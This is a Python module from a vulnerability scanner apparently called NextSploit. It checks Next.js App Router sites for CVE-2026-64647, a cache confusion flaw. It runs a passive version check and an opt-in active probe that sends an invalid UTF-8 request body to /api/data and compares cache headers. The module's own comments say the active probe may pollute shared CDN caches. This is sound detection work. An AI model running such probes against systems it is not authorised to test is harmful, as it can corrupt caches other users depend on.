#!/usr/bin/env python3
"""
NextSploit — CVE-2026-64647: Cache Confusion via Invalid UTF-8 Request Body

Variant of CVE-2026-64648, triggered by request bodies with invalid UTF-8 bytes.
Same passive/active split — requires --confirm-active for differential test.
WARNING: active test may pollute shared cache/CDN state.

Affected: >= 13.0.0, < 15.5.21 | >= 16.0.0, < 16.2.11
"""

import requests
from core.config import ScanConfig
from core.cve_database import CVE_DATABASE, check_vuln_status
from core.reporter import ModuleResult, Finding, ScanStatus
from core.output import log_info, log_success, log_warning, log_debug, print_finding

CVE_ID   = "CVE-2026-64647"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Invalid UTF-8 byte sequence
_INVALID_UTF8 = b"\xff\xfe" + b"nextsploit-invalid-utf8-probe"


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(cve=CVE_ID, title=CVE_INFO["title"],
                          severity=CVE_INFO["severity"], status=ScanStatus.SAFE)

    session = config.create_session()
    target  = config.target.rstrip("/")
    log_info(f"Starting {CVE_ID} — cache confusion invalid UTF-8 variant...")

    if not config.has_app_router():
        detail = f"Target does not use App Router — {CVE_ID} applies ONLY to App Router applications (GHSA-4633-3j49-mh5q)."
        result.status=ScanStatus.NOT_APPLICABLE
        result.add_finding(Finding(
            cve=CVE_ID, severity=CVE_INFO["severity"],
            title="App Router Precondition Not Met",
            status=ScanStatus.NOT_APPLICABLE, detail=detail,
            evidence={"has_app_router": False}, confidence=1.0
        ))
        log_info(detail)
        return result

    best_ver = config.version_state.best()
    version_detected = best_ver.value if best_ver else None
    version_vulnerable = False
    if version_detected:
        vs = check_vuln_status(version_detected, CVE_ID)
        if vs == "PATCHED":
            log_success(f"{version_detected} is patched.")
            return result
        if vs == "VULNERABLE":
            version_vulnerable = True
            log_warning(f"{version_detected} is in the vulnerable range.")

    if not config.confirm_active:
        if version_vulnerable:
            detail = (
                f"Version {version_detected} in vulnerable range for {CVE_ID}. "
                "Active confirmation requires --confirm-active "
                "(WARNING: may pollute shared cache/CDN)."
            )
            result.status=ScanStatus.INCONCLUSIVE
            result.add_finding(Finding(
                cve=CVE_ID, severity=CVE_INFO["severity"],
                title="Cache Confusion (invalid UTF-8 body) — Unconfirmed",
                status=ScanStatus.INCONCLUSIVE, detail=detail,
                evidence={"detected_version": version_detected or "unknown",
                          "note": "Requires --confirm-active for differential cache test.",
                          "warning": "Active test may pollute shared CDN cache."},
                confidence=0.35,
            ))
            log_warning(detail)
        else:
            log_success(f"No {CVE_ID} indicators detected (passive mode).")
        return result

    log_warning(
        "[!] CVE-2026-64647: Active mode — invalid UTF-8 body cache confusion test. "
        "May pollute shared cache/CDN state visible to other users of the target."
    )

    probe_url = f"{target}/api/data"
    confused = False
    active_evidence = {}

    try:
        r_valid = session.post(probe_url, data=b"valid-probe",
                               headers={"Content-Type": "text/plain"}, timeout=config.timeout)
        r_invalid = session.post(probe_url, data=_INVALID_UTF8,
                                 headers={"Content-Type": "text/plain"}, timeout=config.timeout)
        cache_inv = r_invalid.headers.get("x-nextjs-cache", r_invalid.headers.get("cf-cache-status", ""))
        if r_valid.status_code == 200 and r_invalid.status_code == 200 and r_valid.text == r_invalid.text:
            if "HIT" in cache_inv.upper():
                confused = True
                active_evidence = {
                    "probe_url": probe_url,
                    "invalid_utf8_body": repr(_INVALID_UTF8),
                    "cache_status_invalid": cache_inv,
                    "detection": "Invalid UTF-8 body request received cached valid response — confusion.",
                }
        log_debug(f"CVE-2026-64647 active: valid={r_valid.status_code} invalid={r_invalid.status_code}")
    except requests.RequestException as e:
        log_debug(f"Active probe error: {e}")

    if confused and version_vulnerable:
        detail = f"CONFIRMED: {version_detected} + cache confusion via invalid UTF-8 body."
        confidence = 0.87
    elif confused:
        detail = "Cache confusion confirmed with invalid UTF-8 body. Version unconfirmed."
        confidence = 0.58
    elif version_vulnerable:
        detail = f"{version_detected} in vulnerable range. Active test did not confirm confusion."
        confidence = 0.33
    else:
        log_success(f"No {CVE_ID} indicators detected.")
        return result

    active_evidence["detected_version"] = version_detected or "unknown"
    active_evidence["remediation"] = "Upgrade to 15.5.21+ or 16.2.11+."
    log_warning(detail)
    print_finding(CVE_ID, detail, active_evidence)
    result.add_finding(Finding(cve=CVE_ID, severity=CVE_INFO["severity"],
        title="Cache Confusion — Invalid UTF-8 Request Body Variant",
        status=ScanStatus.VULNERABLE, detail=detail, evidence=active_evidence, confidence=confidence))
    return result
